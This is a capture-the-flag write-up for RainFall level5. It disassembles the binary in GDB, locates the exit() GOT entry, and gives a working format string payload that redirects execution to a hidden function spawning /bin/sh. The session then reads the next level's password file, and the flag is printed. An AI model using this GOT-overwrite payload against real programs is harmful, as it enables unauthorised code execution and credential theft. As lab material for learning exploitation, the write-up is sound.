# Level5

## Exploring the binary
```shell
level5@RainFall:~$ ./level5
phantom
phantom
level5@RainFall:~$ ./level5
society 42
society 42
```
Similar to previous levels, this binary program awaits standard input and then prints it out.

## GDB analysis
```shell
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:		push   %ebp
   0x08048505 <+1>:		mov    %esp,%ebp
   0x08048507 <+3>:		and    $0xfffffff0,%esp
   0x0804850a <+6>:		call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.
```
The main function calls <code>n()</code> upon execution.
```shell
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:		push   %ebp
   0x080484c3 <+1>:		mov    %esp,%ebp
   0x080484c5 <+3>:		sub    $0x218,%esp
   0x080484cb <+9>:		mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```
The input is once again collected using <code>fgets()</code> and safeguarded against buffer overflow. This function does not return to <code>main()</code> - it immediately terminates by calling <code>exit()</code>. It appears that we may encounter a <code>format string</code> attack again. We decide to look for other functions, since this is one is not offering much.
```shell
(gdb) i func
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```
This reveals function <code>o()</code>, which is not used during runtime.
``` shell
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:		push   %ebp
   0x080484a5 <+1>:		mov    %esp,%ebp
   0x080484a7 <+3>:		sub    $0x18,%esp
   0x080484aa <+6>:		movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

At memory address <code>0x80485f0</code>, we locate the sought-after <code>/bin/bash</code>. Consequently, our next task is to devise a method to invoke this function at runtime.
```shell
(gdb) x/s 0x80485f0
0x80485f0:	 "/bin/sh"
```
## format string attack
We first determine which specific stack parameter is occupied by a string passed to <code>printf</code>.
``` shell
level5@RainFall:~$ python -c 'print "AAAA" + " %p" * 5' > /tmp/pattern5
level5@RainFall:~$ cat /tmp/pattern5 - | ./level5
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```
We found that the string <code>AAAA</code> resides in the fourth position of the buffer. Our next task is to locate the address of the <code>exit()</code> function, as we intend to overwrite this address with the address of our function <code>o()</code> (<code>0x080484a4</code>). To accomplish this, we need to inspect the dynamic relocation entries, which include the addresses stored in the <code>Global Offset Table (GOT)</code>:
``` shell
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```
This reveals that <code>exit()</code> resides at address <code>0x08049838</code>. With this information, we can now construct the <code>format string</code> attack to overwrite the address of <code>exit()</code> with the address of the <code>o()</code> function. To accomplish this using <code>printf()</code>, we first convert the hexadecimal address of <code>o()</code> to its decimal equivalent:
```shell
(gdb) print 0x080484a4
$1 = 134513828
```

## Exploit
``` shell
level5@RainFall:~$ python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d%4$n"' > /tmp/flag5
level5@RainFall:~$ cat /tmp/flag5 - | ./level5
[...]
                                                                                                  512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
